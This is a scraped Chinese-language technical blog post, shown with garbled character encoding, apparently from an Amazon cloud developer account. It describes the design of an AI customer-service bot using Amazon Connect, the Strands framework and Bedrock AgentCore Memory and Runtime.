<guid>https://juejin.cn/post/7583906478328004627</guid>    <pubDate>2025-12-15T10:06:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583906478328004627" data-draft-id="7583892482597847055" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Amazon Connectç»“åˆStrandsæ¡†æ¶åŠBedrock Agent Coreçš„æ™ºèƒ½å®¢æœæœºå™¨äººè§£å†³æ–¹æ¡ˆï¼ˆå®è·µç¯‡ï¼‰"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-15T10:06:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äºšé©¬é€Šäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2850395271209496"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Amazon Connectç»“åˆStrandsæ¡†æ¶åŠBedrock Agent Coreçš„æ™ºèƒ½å®¢æœæœºå™¨äººè§£å†³æ–¹æ¡ˆï¼ˆå®è·µç¯‡ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2850395271209496/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äºšé©¬é€Šäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:06:14.000Z" title="Mon Dec 15 2025 10:06:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93fa72d8f1724511954986f93e5478a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=E3VhPW0NfQMzqZhsatnwPJ8sWq8%3D" alt="image.png" loading="lazy"/>
å»¶ç»­ä¹‹å‰å‘å¸ƒçš„åŸºäºBedrockå’ŒAmazon Connectæ‰“é€ æ™ºèƒ½å®¢æœè‡ªåŠ©æœåŠ¡è®¾è®¡ç¯‡ï¼Œæœ¬åšå®¢å°†å±•ç¤ºæ™ºèƒ½å®¢æœè‡ªåŠ©æœåŠ¡é¢†åŸŸä¸­å¦‚ä½•åˆ©ç”¨Strandsæ¡†æ¶å’ŒAmazon Connectè¿›è¡Œé›†æˆï¼ŒåŒæ—¶ç»“åˆBedrock AgentCore MemoryåŠRuntimeåŠŸèƒ½çš„æœ€ä½³å®è·µåŠè§£å†³æ–¹æ¡ˆæŠ€æœ¯æ¡†æ¶ã€‚</p>
<blockquote>
<p>ğŸ“¢é™æ—¶æ’æ’­ï¼šæ— éœ€ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œåˆ©ç”¨äºšé©¬é€ŠæŠ€æœ¯ä¸ç”Ÿæ€ï¼Œå¿«é€Ÿé›†æˆä¸éƒ¨ç½²ç”Ÿæˆå¼AIæ¨¡å‹èƒ½åŠ›ã€‚</p>
<p>âœ¨ ç²¾å¿ƒè®¾è®¡ï¼Œæ—¨åœ¨å¼•å¯¼æ‚¨æ·±å…¥æ¢ç´¢Amazon Bedrockçš„æ¨¡å‹é€‰æ‹©ä¸è°ƒç”¨ã€æ¨¡å‹è‡ªåŠ¨åŒ–è¯„ä¼°ä»¥åŠå®‰å…¨å›´æ (Guardrail)ç­‰é‡è¦åŠŸèƒ½ã€‚</p>
<p>â©å¿«å¿«ç‚¹å‡»è¿›å…¥ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejinhead_0606%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejinhead_0606" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejinhead_0606&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejinhead_0606" ref="nofollow noopener noreferrer">å¤šæ¨¡ä¸€ç«™é€š â€”â€” Amazon Bedrock ä¸Šçš„åŸºç¡€æ¨¡å‹åˆä½“éªŒ</a>ã€‹å®éªŒæ„å»ºæ— é™, æ¢ç´¢å¯ç¨‹ï¼</p>
</blockquote>
<h2 data-id="heading-0">1. å®¢æˆ·å¯¹æ™ºèƒ½å®¢æœè‡ªåŠ©æœºå™¨äººçš„è¯„ä»·æŒ‡æ ‡ï¼š</h2>
<p>å®¢æˆ·å¯¹æ™ºèƒ½å®¢æœè‡ªåŠ©æœºå™¨äººçš„è¯„ä»·æŒ‡æ ‡ï¼Œä¸€èˆ¬ä¼šä» æœåŠ¡æ•ˆæœã€ä½“éªŒæ„Ÿå—ã€ç³»ç»Ÿæ€§èƒ½ã€ç®¡ç†è¿è¥ å››ä¸ªç»´åº¦æ¥è¡¡é‡ã€‚</p>
<h3 data-id="heading-1"><strong>1.1</strong> <strong>æœåŠ¡æ•ˆæœç±»</strong></h3>
<ul>
<li>é—®é¢˜è§£å†³ç‡ï¼ˆResolution Rateï¼‰ï¼šæœºå™¨äººèƒ½å¦çœŸæ­£å¸®å®¢æˆ·è§£å†³é—®é¢˜ã€‚</li>
<li>é¦–æ¬¡è§£ç­”æ­£ç¡®ç‡ï¼ˆFirst Contact Resolution, FCRï¼‰ï¼šä¸€æ¬¡å¯¹è¯æ˜¯å¦å°±èƒ½ç»™å‡ºå‡†ç¡®ç­”æ¡ˆã€‚</li>
<li>çŸ¥è¯†è¦†ç›–ç‡ï¼šæœºå™¨äººèƒ½å›ç­”çš„å¸¸è§é—®é¢˜æ¯”ä¾‹ã€‚</li>
<li>äººå·¥è½¬æ¥ç‡ï¼šéœ€è¦è½¬äººå·¥çš„æ¯”ä¾‹ï¼ˆè¶Šä½è¯´æ˜æœºå™¨äººæ›´æœ‰æ•ˆï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2"><strong>1.2.</strong> <strong>ç”¨æˆ·ä½“éªŒç±»</strong></h3>
<ul>
<li>å“åº”é€Ÿåº¦ï¼šä»æé—®åˆ°ç­”å¤çš„æ—¶é—´ã€‚</li>
<li>äº¤äº’è‡ªç„¶åº¦ï¼šè¯­è¨€æ˜¯å¦æµç•…ï¼Œæ˜¯å¦åƒä¸äººå¯¹è¯ã€‚</li>
<li>å¤šè½®å¯¹è¯é¡ºç•…åº¦ï¼šæ˜¯å¦èƒ½è®°ä½ä¸Šä¸‹æ–‡ï¼Œé¿å…é‡å¤æé—®ã€‚</li>
<li>ä¸ªæ€§åŒ–ç¨‹åº¦ï¼šæ˜¯å¦èƒ½åŸºäºç”¨æˆ·å†å²ã€åå¥½æä¾›å®šåˆ¶åŒ–å›ç­”ã€‚</li>
<li>æ»¡æ„åº¦è¯„åˆ†ï¼ˆCSATï¼‰ï¼šå®¢æˆ·å¯¹æœåŠ¡çš„å³æ—¶è¯„ä»·ã€‚</li>
</ul>
<h3 data-id="heading-3"><strong>1.3.</strong> <strong>ç³»ç»Ÿæ€§èƒ½ç±»</strong></h3>
<ul>
<li>ç¨³å®šæ€§ä¸å¯ç”¨æ€§ï¼šæ˜¯å¦å‡ºç°å´©æºƒã€è¶…æ—¶ã€ç­”éæ‰€é—®ã€‚</li>
<li>å¹¶å‘å¤„ç†èƒ½åŠ›ï¼šé«˜å³°æœŸå“åº”æ˜¯å¦ä¾ç„¶æµç•…ã€‚</li>
<li>å‡†ç¡®ç‡ä¸å¬å›ç‡ï¼šæ„å›¾è¯†åˆ«æ˜¯å¦ç²¾å‡†ï¼ŒçŸ¥è¯†æ£€ç´¢æ˜¯å¦å…¨é¢ã€‚</li>
<li>å®‰å…¨ä¸åˆè§„æ€§ï¼šæ˜¯å¦ä¿éšœç”¨æˆ·éšç§ä¸æ•°æ®å®‰å…¨ã€‚</li>
</ul>
<h3 data-id="heading-4"><strong>1.4.</strong> <strong>ç®¡ç†ä¸è¿è¥ç±»</strong></h3>
<ul>
<li>çŸ¥è¯†æ›´æ–°åŠæ—¶æ€§ï¼šçŸ¥è¯†åº“å†…å®¹æ˜¯å¦å¿«é€Ÿæ›´æ–°ã€‚</li>
<li>è¿è¥å¯è§†åŒ–ï¼šåå°æ˜¯å¦æä¾›å¯¹è¯åˆ†æã€ç”¨æˆ·ç”»åƒã€çƒ­ç‚¹é—®é¢˜ç»Ÿè®¡ã€‚</li>
<li>è‡ªæˆ‘å­¦ä¹ ä¸ä¼˜åŒ–èƒ½åŠ›ï¼šæ˜¯å¦èƒ½é€šè¿‡åé¦ˆæŒç»­æ”¹è¿›ã€‚</li>
<li>äººå·¥å®¢æœååŒåº¦ï¼šè½¬äººå·¥æ—¶æ˜¯å¦æ— ç¼è¡”æ¥ã€‚</li>
<li>ROI ä¸æˆæœ¬èŠ‚çœï¼šå‡å°‘äººå·¥å®¢æœæˆæœ¬ã€æå‡æ•´ä½“æ•ˆç‡ã€‚<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></li>
</ul>
<h2 data-id="heading-5">2. åŸºäºGenAIæ™ºèƒ½å®¢æœè‡ªåŠ©ç³»ç»Ÿè®¾è®¡ä¸­Agentæ¡†æ¶é€‰æ‹©çš„å› ç´ </h2>
<p>åœ¨åŸºäº GenAI çš„æ™ºèƒ½å®¢æœè‡ªåŠ©ç³»ç»Ÿè®¾è®¡ä¸­ï¼Œé€‰æ‹© Agent æ¡†æ¶ æ—¶è¦è€ƒè™‘å¤šä¸ªå› ç´ ï¼Œå› ä¸º Agent ä¸ä»…æ˜¯â€œé—®ç­”æœºå™¨äººâ€ï¼Œè¿˜éœ€è¦ä½œä¸ºä¸€ä¸ªå¯ä»¥è°ƒç”¨çŸ¥è¯†åº“ã€ä¸šåŠ¡ç³»ç»Ÿã€å·¥å…·ï¼ˆToolï¼‰å’Œäººå·¥å®¢æœçš„æ™ºèƒ½ä½“æ¥è¿ä½œã€‚</p>
<p>ç›®å‰Agentic AIä¸æ–­å‘å±•ï¼Œæ–°æŠ€æœ¯æ–°æ¨¡å¼å±‚å‡ºä¸ç©·ï¼Œä¸»è¦å¾€æ›´æ™ºèƒ½åŒ–ï¼Œæ›´è‡ªåŠ¨åŒ–çš„æ–¹å‘å‘å±•ï¼Œä½†åœ¨æ™ºèƒ½å®¢æœé¢†åŸŸä¸»è¦æ˜¯è¦æé«˜å®¢æˆ·æ»¡æ„åº¦ï¼ŒçœŸæ­£å¸®åŠ©å®¢æˆ·è§£å†³é—®é¢˜ï¼Œè¯¥åœºæ™¯éœ€è¦åŒæ–¹äº’åŠ¨ï¼Œå› æ­¤ä»ç›®å‰å®é™…é¡¹ç›®æ•ˆæœæ¥çœ‹WorkFlowæ¨¡å¼æ›´é€‚åˆè¯¥åœºæ™¯ï¼Œæœ¬æ¬¡å®è·µä¹Ÿæ˜¯é‡‡ç”¨äº†Standsæ¡†æ¶ä¸­çš„WorkFlowæ¥å®ç°ã€‚</p>
<h3 data-id="heading-6"><strong>2.1</strong> <strong>æŠ€æœ¯èƒ½åŠ›ä¸é€‚é…åº¦</strong></h3>
<p>å¤§æ¨¡å‹é€‚é…ï¼šæ˜¯å¦æ”¯æŒæ¥å…¥å¤šç§åŸºç¡€æ¨¡å‹ï¼Œé¿å…é”å®šå•ä¸€æ¨¡å‹ã€‚</p>
<p>å¤šå·¥å…·è°ƒç”¨ï¼šèƒ½å¦çµæ´»è°ƒç”¨æ•°æ®åº“ã€APIã€CRMã€ERPã€æ”¯ä»˜ç³»ç»Ÿã€å·¥å•ç³»ç»Ÿç­‰ã€‚</p>
<p>ä¸Šä¸‹æ–‡ç®¡ç†ï¼šæ”¯æŒé•¿å¯¹è¯è®°å¿†ã€å¤šè½®å¯¹è¯è¿½è¸ªã€ä¼šè¯çŠ¶æ€ç®¡ç†ã€‚</p>
<p>çŸ¥è¯†å¢å¼º (RAG)ï¼šæ˜¯å¦æ”¯æŒæ–‡æ¡£æ£€ç´¢ã€çŸ¥è¯†å›¾è°±ã€FAQçŸ¥è¯†åº“é›†æˆã€‚</p>
<h3 data-id="heading-7"><strong>2.2</strong> <strong>ç³»ç»Ÿæ¶æ„ä¸æ‰©å±•æ€§</strong></h3>
<p>æ¨¡å—åŒ–è®¾è®¡ï¼šæ˜¯å¦æ”¯æŒåˆ†å±‚æ¶æ„ï¼ˆå¯¹è¯ç®¡ç†ã€ä»»åŠ¡ä»£ç†ã€å·¥å…·ä»£ç†ï¼‰ã€‚</p>
<p>å¯æ‰©å±•æ€§ï¼šèƒ½å¦å¿«é€Ÿå¢åŠ æ–°åœºæ™¯ã€æ–°ä¸šåŠ¡æµç¨‹ã€‚</p>
<p>è·¨æ¸ é“æ”¯æŒï¼šæ˜¯å¦æ”¯æŒæ¥å…¥Webã€Appã€å¾®ä¿¡ã€WhatsAppã€ç”µè¯IVRç­‰æ¸ é“ã€‚</p>
<p>ç¼–æ’èƒ½åŠ›ï¼šèƒ½å¦ç”¨å·¥ä½œæµæˆ–ä½ä»£ç æ–¹å¼ç¼–æ’å¯¹è¯ä¸å·¥å…·è°ƒç”¨ã€‚</p>
<h3 data-id="heading-8"><strong>2.3</strong> <strong>æ€§èƒ½ä¸ç¨³å®šæ€§</strong></h3>
<p>å®æ—¶æ€§ï¼šå“åº”æ˜¯å¦å¿«é€Ÿï¼Œèƒ½å¦æ»¡è¶³æ¯«ç§’çº§å“åº”éœ€æ±‚ã€‚</p>
<p>å¹¶å‘èƒ½åŠ›ï¼šæ˜¯å¦èƒ½æ”¯æ’‘é«˜å¹¶å‘åœºæ™¯ï¼ˆç”µå•†ä¿ƒé”€ã€æ¸¸æˆæ´»åŠ¨é«˜å³°ï¼‰ã€‚</p>
<p>å¥å£®æ€§ï¼šåº”å¯¹æ¨¡å‹å›ç­”é”™è¯¯ã€APIè¶…æ—¶ç­‰å¼‚å¸¸æ—¶ï¼Œæ˜¯å¦æœ‰é™çº§æœºåˆ¶ã€‚</p>
<h3 data-id="heading-9"><strong>2.4</strong> <strong>å®‰å…¨ä¸åˆè§„</strong></h3>
<p>æ•°æ®å®‰å…¨ï¼šæ˜¯å¦æ”¯æŒæ•æ„Ÿä¿¡æ¯è„±æ•ã€åŠ å¯†å­˜å‚¨ã€è®¿é—®æƒé™æ§åˆ¶ã€‚</p>
<p>åˆè§„è¦æ±‚ï¼šæ˜¯å¦æ»¡è¶³ GDPRã€CCPAã€ç½‘ç»œå®‰å…¨æ³•ç­‰æ³•è§„è¦æ±‚ã€‚</p>
<p>å¯æ§æ€§ï¼šæ˜¯å¦æœ‰å®‰å…¨æŠ¤æ ï¼Œé˜²æ­¢æ¨¡å‹ç”Ÿæˆä¸å½“å†…å®¹ï¼ˆè¶Šæƒæ“ä½œã€è¿è§„å›ç­”ï¼‰ã€‚</p>
<h3 data-id="heading-10"><strong>2.5</strong> <strong>è¿ç»´ä¸ä¼˜åŒ–èƒ½åŠ›</strong></h3>
<p>å¯è§‚æµ‹æ€§ï¼šæ˜¯å¦èƒ½è¿½è¸ªå¯¹è¯æ—¥å¿—ã€Agentè°ƒç”¨é“¾è·¯ï¼Œä¾¿äºé—®é¢˜å®šä½ã€‚</p>
<p>å¯è®­ç»ƒæ€§ï¼šæ˜¯å¦æ”¯æŒæŒç»­å­¦ä¹ ï¼ˆåŸºäºç”¨æˆ·åé¦ˆä¼˜åŒ–ï¼‰ã€‚</p>
<p>A/B æµ‹è¯•ï¼šèƒ½å¦åœ¨ä¸åŒ Agent ç­–ç•¥æˆ–æ¨¡å‹ä¹‹é—´åšå¯¹æ¯”å®éªŒã€‚</p>
<p>æˆæœ¬æ§åˆ¶ï¼šè°ƒç”¨å¤§æ¨¡å‹çš„ Token æ¶ˆè€—ä¸æ¡†æ¶ä¼˜åŒ–èƒ½åŠ›ï¼ˆå¦‚ç¼“å­˜ã€æ··åˆæ¨¡å‹è°ƒç”¨ï¼‰ã€‚</p>
<h2 data-id="heading-11">3. Amazon Connectç»“åˆStrandså’ŒBedrock AgentCoreæ™ºèƒ½å®¢æœè‡ªåŠ©ç³»ç»Ÿæ¶æ„è®¾è®¡</h2>
<h3 data-id="heading-12">3.1 è§£å†³æ–¹æ¡ˆHigh Levelè®¾è®¡</h3>
<p>æœ¬æ¬¡å®è·µé‡‡ç”¨Amazon Connectçš„Chatæ–‡å­—èŠå¤©ä½œä¸ºå®¢æˆ·æ¥å…¥æ–¹å¼ï¼Œæ•´ä¸ªè‡ªåŠ©æœåŠ¡çš„æµç¨‹æ§åˆ¶é‡‡ç”¨Amazon Connectçš„Workflowè®¾è®¡å®ç°ï¼Œå®¢æˆ·è¾“å…¥åç”±Connecté€šè¿‡lambdaæ¥è°ƒç”¨GenAIæ¨¡å‹æ¥å®ç°æ„å›¾è¯†åˆ«ï¼ŒåŸºäºBedrockçš„RAGçŸ¥è¯†åº“æŸ¥è¯¢ï¼ŒåŸºäºStandsæ¡†æ¶çš„çš„ Multi Agentæ¥å®ç°è‡ªåŠ©æœåŠ¡ï¼Œä¸åŒçš„æ„å›¾ä¼šå¯¹åº”ä¸åŒçš„å¤„ç†æµç¨‹ï¼Œè¯¦è§å›¾1ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ee85354ff724c1288cfe20212aa848e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=WgGO4kisIfvEZ1x%2FDxL8d67a%2FaQ%3D" alt="1.webp" loading="lazy"/></p>
<p align="center">å›¾1 è§£å†³æ–¹æ¡ˆHigh Levelè®¾è®¡</p>
<h3 data-id="heading-13">3.2 ç³»ç»Ÿæ¶æ„è®¾è®¡</h3>
<p>æ•´ä¸ªè§£å†³æ–¹æ¡ˆå¯ä»¥åŒæ—¶æ”¯æŒç”µè¯åŠæ–‡å­—èŠå¤©ç­‰å¤šæ¸ é“å‘¼å«ä¸­å¿ƒè§£å†³æ–¹æ¡ˆï¼Œä¸åŒçš„æ¥å…¥æ¸ é“é‡‡ç”¨ç»Ÿä¸€çš„æµç¨‹ç®¡ç†ã€‚æ•´ä½“æ–¹æ¡ˆè®¾è®¡ä¸­ä»¥Amazon Connectä½œä¸ºå‘¼å«ä¸­å¿ƒå¹³å°æ ¸å¿ƒæœåŠ¡å¹³å°ï¼ŒåŒæ—¶é‡‡ç”¨Amazon Lexä½œä¸ºè‡ªä¸»æœåŠ¡ç»„ä»¶ï¼ŒAmazon Lexä»¥åŠAmazon Connect Content Flowé€šè¿‡è°ƒç”¨Lambdaæ¥å®ç°å¯¹Bedrock Cluadeæ¨¡å‹çš„è°ƒç”¨ä»¥åŠBedrock çŸ¥è¯†åº“çš„è°ƒç”¨ã€‚è¯¦ç»†æµç¨‹è§å›¾2.</p>
<p><strong>ä¸šåŠ¡æµç¨‹è¯´æ˜ï¼š</strong></p>
<ul>
<li>é€šè¿‡å†…éƒ¨CRMç³»ç»Ÿæ•´ç†çŸ¥è¯†åº“æ–‡ä»¶å¹¶æ”¾å…¥S3ï¼Œé‡‡ç”¨BedrockçŸ¥è¯†åº“æœåŠ¡å¹¶åŒæ­¥S3æ•°æ®æº</li>
<li>å®¢æˆ·é€šè¿‡æ–‡å­—èŠå¤©å‘èµ·æœåŠ¡å¹¶è¿›å…¥connectæœåŠ¡</li>
<li>Connecté€šè¿‡Workflowå®šåˆ¶æµç¨‹å¹¶è°ƒç”¨lexè¿›è¡Œå¯¹è¯äº¤æµ</li>
<li>Lambdaå®ç°å®¢æˆ·æ„å›¾è¯†åˆ«åŠè°ƒç”¨AgentCore Memoryå®ç°ä¼šè¯è®°å¿†</li>
<li>Connect workflowè·å–åˆ°å®¢æˆ·è‡ªåŠ©æœåŠ¡å°±è°ƒç”¨Lambda</li>
<li>Lambdaè°ƒç”¨åŸºäºStrandsæ¡†æ¶ç¼–å†™å¹¶è¿è¡Œåœ¨AgentCore Runtimeä¸Šçš„Agentå®ç°è‡ªåŠ©æœåŠ¡</li>
<li>è‡ªåŠ©æœåŠ¡æ»¡è¶³ä¸äº†å®¢æˆ·éœ€æ±‚ï¼Œè½¬äººå·¥åå¸­</li>
<li>åå¸­è°ƒç”¨AgentCore Memoryé•¿æœŸè®°å¿†åŠŸèƒ½è·å–ä¹‹å‰å¯¹è¯æ€»ç»“å¹¶ä¸ºå®¢æˆ·ç»§ç»­æä¾›æœåŠ¡</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6fcc97740444a3a99ca61ff2125fd34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=SQCrB0UC3ftwloaKhAm6SLlauTk%3D" alt="55e2297e86addf4444034bca0f0b7bd3.png" loading="lazy"/></p>
<p align="center">å›¾2 è¯¦ç»†ç³»ç»Ÿæ¶æ„è®¾è®¡å›¾</p>
<h3 data-id="heading-14">3.3 å¯¹è¯è®°å¿†åŠŸèƒ½å®ç°è§£æ</h3>
<p>å¦‚ä½•å®ç°å¯¹è¯è®°å¿†åŠŸèƒ½æœ‰å¯ä»¥æœ‰å¤šç§æ–¹æ¡ˆï¼Œä¹‹å‰åšå®¢é‡‡ç”¨çš„æ˜¯åˆ©ç”¨Amazon Connectçš„éšè·¯æ•°æ®æ¥å®ç°ã€‚æœ¬æ¬¡é‡‡ç”¨Bedrock AgentCore Memoryæœ€æ–°æœåŠ¡æ¥å®ç°ã€‚</p>
<p>Amazon Bedrock AgentCore çš„ Memory æ¨¡å—æ˜¯ä¸€ä¸ªç”±äºšé©¬é€Šäº‘ç§‘æŠ€æ‰˜ç®¡çš„æŒä¹…åŒ–è®°å¿†ç³»ç»Ÿï¼Œç”¨äºå­˜å‚¨å’Œç®¡ç† AI Agent çš„å¯¹è¯å’ŒçŸ¥è¯†ã€‚å®ƒæä¾›çŸ­æœŸè®°å¿†ï¼ˆshort-term memoryï¼‰å’Œé•¿æœŸè®°å¿†ï¼ˆlong-term memoryï¼‰ä¸¤ç§æ¨¡å¼ã€‚çŸ­æœŸè®°å¿†è´Ÿè´£åœ¨ä¸€æ¬¡ä¼šè¯ä¸­è®°å½•æœ€è¿‘çš„äº¤äº’å†…å®¹ï¼ˆä¾‹å¦‚æœ€è¿‘å‡ è½®å¯¹è¯ï¼‰ï¼Œç¡®ä¿ä»£ç†èƒ½å¤Ÿâ€œè®°ä½â€å½“å‰å¯¹è¯çš„ä¸Šä¸‹æ–‡ã€‚é•¿æœŸè®°å¿†åˆ™ä»å¯¹è¯ä¸­æå–ç»“æ„åŒ–çš„å…³é”®ä¿¡æ¯ï¼Œåœ¨å¤šä¸ªä¼šè¯ä¹‹é—´ä¿ç•™çŸ¥è¯†ï¼Œä½¿Agentèƒ½å¤Ÿâ€œå­¦ä¹ â€ç”¨æˆ·åå¥½ã€äº‹å®å’Œæ‘˜è¦ç­‰ä¿¡æ¯ã€‚</p>
